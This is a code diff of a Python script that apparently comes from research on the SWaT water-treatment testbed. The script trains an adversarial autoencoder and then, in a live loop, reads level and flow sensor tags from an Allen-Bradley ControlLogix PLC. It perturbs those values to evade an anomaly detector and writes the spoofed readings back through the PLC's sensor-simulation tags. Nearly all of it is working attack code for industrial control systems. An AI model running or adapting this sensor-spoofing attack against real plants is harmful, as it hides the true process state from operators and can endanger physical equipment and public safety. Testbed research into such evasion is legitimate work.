@@ -1,20 +1,20 @@
 #!/usr/bin/env python3
 """
 phase2_spoof.py  —  SWaT Phase 2: Adversarial ML Evasion (Paper #31)
-Target: Allen-Bradley ControlLogix PLC1 over EtherNet/IP
+Target: Allen-Bradley ControlLogix PLC1 via pylogix
 
-Reads live tag values from PLC1 via pycomm3, applies adversarial
-perturbations (constrained to ||delta||_inf <= epsilon) to evade the
-reconstruction-based autoencoder detector, then writes perturbed
-analog values back to PLC1 tags.
+Reads live analog tag values from PLC1, applies adversarial perturbations
+constrained to ||delta||_inf <= 0.1, writes perturbed values back via
+the .Sim / .Sim_PV tag interface (sensor simulation mode).
 
-Modes:
-  train  — train adversarial autoencoder on SWaT normal CSV
-  attack — run live adversarial perturbation against PLC1
+Sensor simulation tag pattern (from lab reference script):
+  write_tag(ip, 'HMI_LIT101.Sim',    True)   # enable simulation
+  write_tag(ip, 'HMI_LIT101.Sim_PV', 200)    # write spoofed value
+  write_tag(ip, 'HMI_LIT101.Sim',    False)  # disable (restore)
 
 Usage:
-  python3 phase2_spoof.py train  --data swat_normal.csv --epochs 100
-  python3 phase2_spoof.py attack --plc-ip 192.168.1.10 --iface eth0 --duration 120
+  python3 phase2_spoof.py train  --data assets/19-Feb-2026_0930_1735.csv
+  python3 phase2_spoof.py attack --plc-ip 192.168.1.10 --duration 120
 """
 
 import argparse, time, signal, sys
@@ -22,21 +22,26 @@ import numpy as np
 import pandas as pd
 import torch
 import torch.nn as nn
-from pycomm3 import LogixDriver, CommError as PycommException
+from pylogix import PLC
 
-EPSILON = 0.1    # ||delta||_inf constraint (Paper #31 Section 4)
-FEATURES = ['LIT101.Pv', 'FIT101.Pv']   # Analog tags to perturb (REAL type)
+EPSILON   = 0.1
+FEATURES  = ['HMI_LIT101.Pv', 'AI_FIT_101_FLOW']
 
-# Tag paths for analog reads/writes on ControlLogix
-ANALOG_TAG_PATHS = {
-    'LIT101.Pv': 'HMI_LIT101:I.Data',
-    'FIT101.Pv': 'HMI_FIT101:I.Data',
+# Simulation tag paths for writing spoofed values
+SIM_TAGS = {
+    'HMI_LIT101.Pv':    ('HMI_LIT101.Sim',    'HMI_LIT101.Sim_PV'),
+    'AI_FIT_101_FLOW':  ('HMI_FIT101.Sim',     'HMI_FIT101.Sim_PV'),
+}
+
+# CSV column names mapping to PLC tag names
+CSV_TO_TAG = {
+    'LIT101.Pv': 'HMI_LIT101.Pv',
+    'FIT101.Pv': 'AI_FIT_101_FLOW',
 }
 
 stop_flag = False
 
 
-# ── Autoencoder ───────────────────────────────────────────────────────────────
 class Autoencoder(nn.Module):
     def __init__(self, input_dim, latent_dim=8):
         super().__init__()
@@ -50,14 +55,11 @@ class Autoencoder(nn.Module):
             nn.Linear(16, 32),         nn.ReLU(),
             nn.Linear(32, input_dim)
         )
-
     def forward(self, x):
         return self.decoder(self.encoder(x))
 
 
-# ── Adversarial Autoencoder (generates perturbation delta) ───────────────────
 class AdversarialEncoder(nn.Module):
-    """Generates delta such that AE(x + delta) looks normal."""
     def __init__(self, input_dim, epsilon=EPSILON):
         super().__init__()
         self.epsilon = epsilon
@@ -66,61 +68,63 @@ class AdversarialEncoder(nn.Module):
             nn.Linear(32, 32),        nn.Tanh(),
             nn.Linear(32, input_dim), nn.Tanh()
         )
-
     def forward(self, x):
-        delta = self.net(x) * self.epsilon   # clamp to [-eps, +eps]
-        return torch.clamp(delta, -self.epsilon, self.epsilon)
+        return torch.clamp(self.net(x) * self.epsilon, -self.epsilon, self.epsilon)
 
 
-def train(data_path, model_path, ae_path, epochs=100, window=10):
-    print(f"[*] Loading SWaT normal data: {data_path}")
+def write_tag(plc, tag, value):
+    plc.Write(tag, value)
+
+
+def train(data_path, model_path, epochs=100, window=10):
+    print(f"[*] Loading {data_path}...")
     df = pd.read_csv(data_path, low_memory=False)
 
-    # Normalise
-    feat_cols = [c for c in FEATURES if c in df.columns]
+    # Map CSV columns to feature names
+    rename = {k: v for k, v in CSV_TO_TAG.items() if k in df.columns}
+    df = df.rename(columns=rename)
+    feat_cols = [f for f in FEATURES if f in df.columns]
+
+    # Fall back to CSV column names if PLC tags not found
     if not feat_cols:
-        print(f"[!] None of {FEATURES} found in CSV. Available: {list(df.columns[:10])}")
+        feat_cols = [k for k in CSV_TO_TAG.keys() if k in df.columns]
+
+    if not feat_cols:
+        print(f"[!] Features not found. Available: {list(df.columns[:10])}")
         sys.exit(1)
 
     for c in feat_cols:
-        df[c] = pd.to_numeric(df[c], errors="coerce")
+        df[c] = pd.to_numeric(df[c], errors='coerce')
+
     data = df[feat_cols].dropna().values.astype(np.float32)
     mu, sigma = data.mean(0), data.std(0) + 1e-8
-    data_norm = (data - mu) / sigma
+    norm = (data - mu) / sigma
 
-    # Sliding window
-    X = np.stack([data_norm[i:i+window] for i in range(len(data_norm)-window)])
-    X_flat = X.reshape(len(X), -1)
-    X_t = torch.tensor(X_flat)
+    X = np.stack([norm[i:i+window].flatten() for i in range(len(norm)-window)])
+    X_t = torch.tensor(X)
+    input_dim = X.shape[1]
 
-    input_dim = X_flat.shape[1]
     ae  = Autoencoder(input_dim)
     adv = AdversarialEncoder(input_dim)
     opt_ae  = torch.optim.Adam(ae.parameters(),  lr=1e-3)
     opt_adv = torch.optim.Adam(adv.parameters(), lr=1e-3)
     mse = nn.MSELoss()
 
-    print(f"[*] Training AE + AdversarialEncoder  epochs={epochs}  input_dim={input_dim}")
-    for epoch in range(1, epochs+1):
-        # Train AE to reconstruct normal data
+    print(f"[*] Training  epochs={epochs}  input_dim={input_dim}  features={feat_cols}")
+    for ep in range(1, epochs+1):
         ae.train(); adv.eval()
         opt_ae.zero_grad()
-        recon = ae(X_t)
-        loss_ae = mse(recon, X_t)
+        loss_ae = mse(ae(X_t), X_t)
         loss_ae.backward(); opt_ae.step()
 
-        # Train AdversarialEncoder to minimise AE reconstruction error on perturbed data
         ae.eval(); adv.train()
         opt_adv.zero_grad()
         delta = adv(X_t)
-        x_adv = X_t + delta
-        recon_adv = ae(x_adv)
-        loss_adv = mse(recon_adv, X_t)   # want AE to see perturbed as normal
+        loss_adv = mse(ae(X_t + delta), X_t)
         loss_adv.backward(); opt_adv.step()
 
-        if epoch % 10 == 0:
-            print(f"    Epoch {epoch:4d}/{epochs}  AE loss={loss_ae.item():.6f}  "
-                  f"Adv loss={loss_adv.item():.6f}")
+        if ep % 10 == 0:
+            print(f"    Epoch {ep:4d}/{epochs}  AE={loss_ae.item():.6f}  Adv={loss_adv.item():.6f}")
 
     torch.save({'ae': ae.state_dict(), 'adv': adv.state_dict(),
                 'mu': mu, 'sigma': sigma, 'window': window,
@@ -130,64 +134,63 @@ def train(data_path, model_path, ae_path, epochs=100, window=10):
 
 def attack(plc_ip, model_path, duration):
     global stop_flag
-    print(f"[*] Loading models from {model_path}")
+    print(f"[*] Loading {model_path}...")
     ckpt = torch.load(model_path, map_location='cpu')
-    ae  = Autoencoder(ckpt['input_dim']);  ae.load_state_dict(ckpt['ae']);  ae.eval()
+    ae  = Autoencoder(ckpt['input_dim']); ae.load_state_dict(ckpt['ae']);   ae.eval()
     adv = AdversarialEncoder(ckpt['input_dim']); adv.load_state_dict(ckpt['adv']); adv.eval()
-    mu, sigma = ckpt['mu'], ckpt['sigma']
-    window, feat_cols = ckpt['window'], ckpt['feat_cols']
+    mu, sigma   = ckpt['mu'], ckpt['sigma']
+    window      = ckpt['window']
+    feat_cols   = ckpt['feat_cols']
+    read_tags   = feat_cols  # use feat_cols as PLC tag names
 
-    print(f"[*] Adversarial attack starting -> PLC {plc_ip}  duration={duration}s")
-    print(f"    Tags: {feat_cols}  epsilon={EPSILON}")
-
-    tag_paths = [ANALOG_TAG_PATHS[f] for f in feat_cols if f in ANALOG_TAG_PATHS]
+    print(f"[*] Adversarial attack -> PLC {plc_ip}  duration={duration}s  epsilon={EPSILON}")
     history = []
     end_time = time.time() + duration
     cycle = 0
 
-    try:
-        with LogixDriver(plc_ip) as plc:
-            while not stop_flag and time.time() < end_time:
-                # Read current analog tag values from PLC
-                results = plc.read(*tag_paths)
-                if not isinstance(results, list):
-                    results = [results]
-                raw_vals = np.array([r.value for r in results], dtype=np.float32)
-
-                # Normalise
-                norm_vals = (raw_vals - mu) / sigma
-                history.append(norm_vals)
-                if len(history) < window:
-                    time.sleep(1.0)
-                    continue
-                history = history[-window:]
-
-                # Build window tensor
-                x = torch.tensor(np.array(history).flatten(), dtype=torch.float32).unsqueeze(0)
-
-                # Generate perturbation
-                with torch.no_grad():
-                    delta = adv(x).squeeze().numpy()
-
-                # Apply delta to last time step only, de-normalise
-                delta_last = delta[-(len(feat_cols)):]
-                perturbed_norm = norm_vals + delta_last
-                perturbed_vals = perturbed_norm * sigma + mu
-
-                # Write perturbed values back to PLC analog tags
-                writes = [(path, float(val)) for path, val in zip(tag_paths, perturbed_vals)]
-                plc.write(*writes)
-
-                cycle += 1
-                if cycle % 5 == 0:
-                    for f, orig, pert in zip(feat_cols, raw_vals, perturbed_vals):
-                        print(f"    [adv {cycle:4d}] {f}: {orig:.3f} -> {pert:.3f}  "
-                              f"(delta={pert-orig:+.4f})")
-
+    with PLC() as plc:
+        plc.IPAddress = plc_ip
+        while not stop_flag and time.time() < end_time:
+            results = plc.Read(read_tags)
+            if not isinstance(results, list):
+                results = [results]
+            raw_vals = np.array([r.Value if r.Value is not None else 0.0
+                                 for r in results], dtype=np.float32)
+            norm_vals = (raw_vals - mu) / sigma
+            history.append(norm_vals)
+            if len(history) < window:
                 time.sleep(1.0)
-    except PycommException as e:
-        print(f"[!] EtherNet/IP error: {e}")
-    print(f"[+] Phase 2 complete. {cycle} adversarial cycles.")
+                continue
+            history = history[-window:]
+
+            x = torch.tensor(np.array(history).flatten(), dtype=torch.float32).unsqueeze(0)
+            with torch.no_grad():
+                delta = adv(x).squeeze().numpy()
+
+            delta_last   = delta[-(len(feat_cols)):]
+            perturbed    = norm_vals + delta_last
+            perturbed_pv = perturbed * sigma + mu
+
+            # Write via Sim interface
+            for feat, orig, pert in zip(feat_cols, raw_vals, perturbed_pv):
+                if feat in SIM_TAGS:
+                    sim_en, sim_pv = SIM_TAGS[feat]
+                    plc.Write(sim_en, True)
+                    plc.Write(sim_pv, float(pert))
+
+            cycle += 1
+            if cycle % 5 == 0:
+                for f, o, p in zip(feat_cols, raw_vals, perturbed_pv):
+                    print(f"    [adv {cycle:4d}] {f}: {o:.3f} -> {p:.3f}  (d={p-o:+.4f})")
+            time.sleep(1.0)
+
+    # Disable simulation on exit
+    with PLC() as plc:
+        plc.IPAddress = plc_ip
+        for feat in feat_cols:
+            if feat in SIM_TAGS:
+                plc.Write(SIM_TAGS[feat][0], False)
+    print(f"[+] Simulation disabled. Phase 2 complete. {cycle} cycles.")
 
 
 def signal_handler(sig, frame):
@@ -201,20 +204,19 @@ def main():
     sub = ap.add_subparsers(dest='mode', required=True)
 
     tr = sub.add_parser('train')
-    tr.add_argument('--data',   required=True, help='SWaT normal CSV path')
+    tr.add_argument('--data',   required=True)
     tr.add_argument('--model',  default='adv_model.pt')
-    tr.add_argument('--epochs', type=int, default=100)
+    tr.add_argument('--epochs', type=int, default=500)
     tr.add_argument('--window', type=int, default=10)
 
     at = sub.add_parser('attack')
-    at.add_argument('--plc-ip',   required=True)
-    at.add_argument('--iface',    default='eth0')
+    at.add_argument('--plc-ip',   default='192.168.1.10')
     at.add_argument('--model',    default='adv_model.pt')
     at.add_argument('--duration', type=int, default=120)
 
     args = ap.parse_args()
     if args.mode == 'train':
-        train(args.data, args.model, args.model, args.epochs, args.window)
+        train(args.data, args.model, args.epochs, args.window)
     else:
         attack(args.plc_ip, args.model, args.duration)
 
